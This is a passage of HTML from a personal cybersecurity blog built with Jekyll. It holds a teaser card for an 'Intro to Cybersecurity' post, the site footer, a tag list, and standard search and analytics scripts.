href="/posts/getting-started-cybersecurity/"><div class="card-body"> <em class="timeago small" data-ts="1653003000" > 2022-05-19 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Intro to Cybersecurity</h3><div class="text-muted small"><p> Intro to Cyber Security Cyber Security continues to be an ever-growing, in-demand career field as everything in our lives transition to computers. SANS has a list of some careers that branch off o...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <span class="btn btn-outline-primary disabled" prompt="Older"><p>-</p></span> <a href="/posts/ready/" class="btn btn-outline-primary" prompt="Newer"><p>Ready</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/gore_ez_knee">Gore-Ez-Knee</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/aws/">aws</a> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/gitlab/">gitlab</a> <a class="post-tag" href="/tags/ubuntu/">ubuntu</a> <a class="post-tag" href="/tags/docker-compose/">docker-compose</a> <a class="post-tag" href="/tags/elastic/">elastic</a> <a class="post-tag" href="/tags/elasticsearch/">elasticsearch</a> <a class="post-tag" href="/tags/evt/">evt</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-BJ7S2G5H9F"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-BJ7S2G5H9F'); }); </script>
